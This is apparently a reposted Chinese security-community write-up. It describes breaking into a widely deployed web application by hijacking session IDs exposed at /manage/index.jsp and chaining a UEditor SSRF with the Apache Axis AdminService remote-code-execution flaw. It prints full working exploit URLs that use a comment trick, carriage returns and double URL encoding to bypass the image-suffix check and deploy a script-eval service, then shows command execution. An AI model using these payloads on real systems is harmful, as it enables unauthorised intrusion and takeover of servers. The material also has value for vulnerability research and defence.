> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/sesveh4L_8osXt7HpVC9Nw)

**本文首发于****奇安信攻防社区**  

**社区有奖征稿**

· 基础稿费、额外激励、推荐作者、连载均有奖励，年度投稿 top3 还有神秘大奖！

· 将稿件提交至奇安信攻防社区（点击底部 阅读原文 ，加入社区）

[点击链接了解征稿详情](https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489051&idx=1&sn=0f4d1ba03debd5bbe4d7da69bc78f4f8&scene=21#wechat_redirect)

**前言**
======

某一天 7iny 好兄弟找到一套源代码 (安装包)，看了一下不少问题。就从这套系统代码开始渗透吧。看了一下 fofa, 有一千多个。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46q7KsgZB7pqrIMQT6w2ViabBVvVUUSgiapex1iaKu1Suo6icyuuBGKWicxKzg/640?wx_fmt=jpeg)

### **step1**

收到源码后发现几个有意思的功能：

1、`/manage/index.jsp`直接列举出来了所有当前的`sessionID`。  
有了 session，我们只需要找到在线的 session 然后替换我们当前的 seesionID 可既可以登录当前系统

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qWWhdfThOUXSyphCwvsiccAVE5aUS1icKrSiclTvLotPpyFeoRLv2oQMww/640?wx_fmt=jpeg)  
好家伙。这么多用户，我们可以登录去用户系统了。打了渗透的大门。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qKHNh4v0SCibElzibxIWxM2Q1wgC0KlkaCXtUTlLIdyPFnTduFARxWN5w/640?wx_fmt=png)

2、进去后发现还有个路径`/mobile/phone/main.jsp`就是手机端的主页面  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qXYABgbf4cNb6HRibjEFHWMJwCC13ZUEENn7PqQKTvd3cEpiaXz8ZdWZg/640?wx_fmt=jpeg)  
还有一些报表的页面，  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qSaL9uIdeOd8vFibfkDu0fluZQwb2Wzgk5HKQbsk6WNU5n2kAcPljKWA/640?wx_fmt=jpeg)  
进去后很可惜发现没有可 RCE 的点。

### **step2**

1.  发现了一个 AXIS 服务。  
    ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qqzTQVfWbjQvKwgiatwLDENdyZEHCqY9KiaKgD9MA2vEw1dFKaibib8tAuQ/640?wx_fmt=jpeg)  
    axis<=1.4 版本存在 RCE，尝试使用已知 payload 打一下，毫无意外的 remote user access is not allowed.
    

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qaoqIu17fNXibn8WhOwaXMW8pH4zjQQeuecLAWrxrt9cwfaicdzoGdm7g/640?wx_fmt=jpeg)  
也就是说只需要找到一个 SSRF，本地调用即可。  
7iny 帮我找到一个利用点，`/common/ueditor1_3_5-utf8/` 发现一个 ueditor

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qPyC8SVssLxexicyWpZ1kKhMiciaGxgMxZ9ZLYR4wWecK0Ih9N0L7kxHrw/640?wx_fmt=jpeg)

这个编辑器存在一个 SSRF。  
`/common/ueditor1_3_5-utf8/jsp/getRemoteImage.jsp?upfile=`  
使用 AXIS 的 get 型 payload 尝试一下，发现图片类型不正确。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qObCF93HTTqHhiaIz5DjyicicQKZMfeY4gaoE9rqTcmd2WeRPiccR6vakaQ/640?wx_fmt=jpeg)

### **step3**

知道是 AXIS, 有`getRemoteImage.jsp`的源码，本地搭建一个环境来 debug, 开启 debug 模式`./catalina.sh jpda start`

#### _**第一次尝试 (先盲猜一下)**_**：**

既然是需要结尾需要一个. jpg。我们在 URL 后直接加. jpg 结尾。也就是：&xx=xx.jpg

```
http://127.0.0.1:8080/axis/services/AdminService?method=!--%3E%3Cdeployment%20x mlns%3D%22http%3A%2F%2Fx ml.apache.org%2Faxis%2Fwsdd%2F%22%20x mlns%3Ajava%3D%22http%3A%2F%2Fx ml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22ServiceFactoryService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22org.apache.axis.client.ServiceFactory%22%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%2F%3E%3C%2Fservice%3E%3C%2Fdeployment&xx=xx.jpg
```

发现还是被 ban。还是提示图片类型不正确。预料之中。

##### _**第二次尝试**_**：**

看一下 remote.jsp 的源码。很简单，就是远程下载一个图片，依次遍历每个参数，并且判断是不是以”.gif” , “.png” , “.jpg” , “.jpeg” , “.bmp” 这些结尾。如果不是图片或者不正确则报错。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46q4Dx9LPTG2EW1DK1puFyzElmfX8aaTQucVBUWmHYy8YIv8nqEJWLticw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46q2jJg4KhDUnS6jYA7iavHE9M3LLyRgYdbpC7yRMBA3bNUlIFeiatvQib2Q/640?wx_fmt=jpeg)  
现在尝试一下，直接接一个. jpg。看一下是不是爆出” 请求地址头不正确”，这个我们预期的结果。

```
http://127.0.0.1:8080/axis/services/AdminService?method=!--%3E%3Cdeployment%20x mlns%3D%22http%3A%2F%2Fx ml.apache.org%2Faxis%2Fwsdd%2F%22%20x mlns%3Ajava%3D%22http%3A%2F%2Fx ml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22ServiceFactoryService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22org.apache.axis.client.ServiceFactory%22%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%2F%3E%3C%2Fservice%3E%3C%2Fdeployment.jpg
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qwclico0LibW4o2tEa9XT9aiaibQV18Vq0Eib4icuajGXz1ctDEejG6IYBpRg/640?wx_fmt=png)  
遗憾的是并不是预期的结果，而是报了一个空指针，事实上，看 remote.jsp 的代码是不会有空指针爆出来，那就只能是框架爆出来的，既然是框架一般而言是有不合法的字符出现会出现此类的情况。  
最后发现是 %20, 不能有空格，因为提交的是 x ml 格式的数据，里面的空格用来做字符的分割，既然不能有空格，那我们直接用换行 %0d%0a，试试看是否可以。

```
http://localhost:8080/remote.jsp?upfile=http://127.0.0.1:8080/axis/services/AdminService?method=!--%3E%3Cdeploymenta%0d%0axxx
```

发现还是空指针。后面通过尝试，只有 %0d 可以，%0a 不行。是不是真的能否作为 x ml 的分隔符现在还不知道。![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qkI8q0VdsNhTdRAJ4dXBv7Df8333H0aJ6bt57QxtS5IiaKKkzd1SERjA/640?wx_fmt=png)

##### _**第三次尝试：**_

开始绕过图片为结尾的后缀，在 get 类型的 payload 中，发现开头有一个!—>，debug 一下跟到代码处，发现是为了做一个拼合。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qBZeibFQQerHRAsKZicyC5C3ehs0zUKuHib4kwgxmKgbF1icPib9dN6T5VsQ/640?wx_fmt=jpeg)  
代码如下：  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qiaafOH5Yh1GuOnYMl1oKcbJSZv85JibD3eKEOXhBNykASWibicpsnTe0NA/640?wx_fmt=jpeg)  
最终拼接后为：  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qW2N03z01gEhrPm9t1F59IKvgNSDClDOhRakQuI8VHPofPsAScL0jww/640?wx_fmt=jpeg)  
刚好把第一个 payload 注释，第二个生效。现在我们只需要做填空题。在结尾拼接就行`<xxx.jpg></xxx.jpg`即可，当然结尾的 > 会给我们自动闭合，刚好以. jpg 结尾，所以新的 payload 如下：  
所以我们只需要在结尾加上`><xx.jpg></xx.jpg` 即可  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qn9WicD1v31WalY5cicLuRBHruLPWH74icgbOmtLTA2DgkOv1CTicfD5rlA/640?wx_fmt=jpeg)

使用 %0d，以及我们拼接的 xx.jpg payload 来提交，debug 后发现 %0d 后的东西丢了

```
http://localhost:8080/remote.jsp?upfile=http://localhost:8080/axis/services/AdminService?method=!--%3E%3Cdeployment%0dx mlns%3D%22http%3A%2F%2Fx ml.apache.org%2Faxis%2Fwsdd%2F%22%0dx mlns%3Ajava%3D%22http%3A%2F%2Fx ml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%0dname%3D%22m00gege%22%0dprovider%3D%22java%3ARPC%22%3E%3Cparameter%0dname%3D%22className%22%0dvalue%3D%22com.sun.s cript.j avas cript.Rhinos criptEngine%22%0d%2F%3E%3Cparameter%0dname%3D%22allowedMethods%22%0dvalue%3D%22e val%22%0d%2F%3E%3CtypeMapping%0ddeserializer%3D%22org.apache.axis.encoding.ser.BeanDeserializerFactory%22%0dtype%3D%22java%3Ajavax.s cript.Simples criptContext%22%0dqname%3D%22ns%3ASimples criptContext%22%0dserializer%3D%22org.apache.axis.encoding.ser.BeanSerializerFactory%22%0dx mlns%3Ans%3D%22urn%3Abeanservice%22%0dregenerateElement%3D%22false%22%3E%3C%2FtypeMapping%3E%3C%2Fservice%3E%3C%2Fdeployment%3E%3Cxx.jpg%3E%3C/xx.jpg
```

访问  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qTib4ZbtqzI3sfic54vKBl4YcbSnliac6EtEMKaEjmrIrUpnmickEquv55A/640?wx_fmt=jpeg)

##### _**第四次尝试：**_

咋办??

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qliaKWLG9szVoRTezQCbe3iaqcbgZu4Xzg8Ex0ic35OTDZoq0v2BlZbgeg/640?wx_fmt=png)

最后灵机一动，试一下 urlencode 双重编码, 成功了。

```
http://localhost:8080/remote.jsp?upfile=http://127.0.0.1:8080/axis/services/AdminService?method=!--%253E%253Cdeployment%250dx mlns%253D%2522http%253A%252F%252Fx ml.apache.org%252Faxis%252Fwsdd%252F%2522%250dx mlns%253Ajava%253D%2522http%253A%252F%252Fx ml.apache.org%252Faxis%252Fwsdd%252Fproviders%252Fjava%2522%253E%253Cservice%250dname%253D%2522mxxgege%2522%250dprovider%253D%2522java%253ARPC%2522%253E%253Cparameter%250dname%253D%2522className%2522%250dvalue%253D%2522com.sun.s cript.j avas cript.Rhinos criptEngine%2522%250d%252F%253E%253Cparameter%250dname%253D%2522allowedMethods%2522%250dvalue%253D%2522e val%2522%250d%252F%253E%253CtypeMapping%250ddeserializer%253D%2522org.apache.axis.encoding.ser.BeanDeserializerFactory%2522%250dtype%253D%2522java%253Ajavax.s cript.Simples criptContext%2522%250dqname%253D%2522ns%253ASimples criptContext%2522%250dserializer%253D%2522org.apache.axis.encoding.ser.BeanSerializerFactory%2522%250dx mlns%253Ans%253D%2522urn%253Abeanservice%2522%250dregenerateElement%253D%2522false%2522%253E%253C%252FtypeMapping%253E%253C%252Fservice%253E%253C%252Fdeployment%253E%253Cxx.jpg%253E%253C%2Fxx.jpg
```

成功了，出现了我们预期的效果。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qAwP4uKJlyNzHgvjyOETicXYMicqBPQ9XqvLZJPKltBU74HXa96DZsgfA/640?wx_fmt=jpeg)  
成功注册服务  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qCMkjmliaxmC91AcaYQ7ib5s3Saa9DlLtGe4uphI2ppGFFM8Zp0OosGpw/640?wx_fmt=jpeg)

##### _**第五次尝试：**_

接下来，直接访问我们部署的服务即可。执行 whoami。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qHndT3rVTIo5yQ2ZicIsWODRfAyvb3nicyMAQrZgYZtW2BcibBFhOk194A/640?wx_fmt=jpeg)

### _**总结**_

觉得这个漏洞可以作为 CTF 来出，挺有意思的一个漏洞，关键点，.jpg 绕过，%20 处理。

  

---

END

  

【版权说明】本作品著作权归 maoge 所有，授权补天漏洞响应平台独家享有信息网络传播权，任何第三方未经授权，不得转载。

  

  

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE7fupM77icRcd9R9s0gNp46qxBNY8mz7gxO55npWYtQ37j1uD8RibnKibImO6Og6TeliaYUaTkzvjK1UQ/640?wx_fmt=jpeg)

maoge

  

一个无战队的随缘挖洞的补天白帽子

**敲黑****板！转发≠学会，课代表给你们划重点了**

**复习列表**

  

  

  

  

  

[记一次文件上传的曲折经历](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489568&idx=1&sn=56beddb5ef58d9556d75bbd8dd146dd2&chksm=eafa506cdd8dd97a9420b312770c8ea1bdeb0394ce38ef54834e60e91c0b404f934ac494ca3c&scene=21#wechat_redirect)

  

[代码审计之 eyouCMS 最新版 getshell 漏洞](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489781&idx=1&sn=a2d0ccd466dfa95067f223c8318a316d&chksm=eafa50b9dd8dd9af45ef4fcf23074aeecc196dc72b3ff447282a9e6ea9904dcc08fe72430d30&scene=21#wechat_redirect)

  

[硬核黑客笔记 - 怒吼吧电磁波 (上)](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489491&idx=1&sn=4ab4db01f63ca3c82c155d82c92b2662&chksm=eafa5f9fdd8dd689bc8cbcde1bb488372f50008619d25ca292753b0356eba4ea405db20349b4&scene=21#wechat_redirect)

  

[从 WEB 弱口令到获取集权类设备权限的过程](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489456&idx=1&sn=a156b1a398e53e0c0d1cc1b8f4bc78f7&chksm=eafa5ffcdd8dd6eae463303a99720247160a79218e86ee494c5defbf6e9d4be0a9b63b13775c&scene=21#wechat_redirect)

  

[一个域内特权提升技巧 | 文末双重福利](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489414&idx=1&sn=f9addeb81e8a2ea160e043ee2b19a4cf&chksm=eafa5fcadd8dd6dc815cdbd43b7311a447ccabb35c98519237448cb643d183b2c264e073bc16&scene=21#wechat_redirect)

  

[php 无文件攻击浅析](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489820&idx=1&sn=5fe5827ab1f5ef7175449be8a822bf08&chksm=eafa5150dd8dd8463acab35b71b0db213923508055ed0e1dd106788206e42de8dc80c5d58232&scene=21#wechat_redirect)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE6D8InhXuGX2q6Cbw7zhMJLFcmlcnz38EApnEkFiaISicklcwbo3gnI17t54PqyYOE8LV4yczIfjdqw/640?wx_fmt=png)  

  

分享、点赞、在看，一键三连，yyds。

![](https://mmbiz.qpic.cn/mmbiz_gif/FIBZec7ucChYUNicUaqntiamEgZ1ZJYzLRasq5S6zvgt10NKsVZhejol3iakHl3ItlFWYc8ZAkDa2lzDc5SHxmqjw/640?wx_fmt=gif)

  

点击阅读原文，加入社区，获取更多技术干货！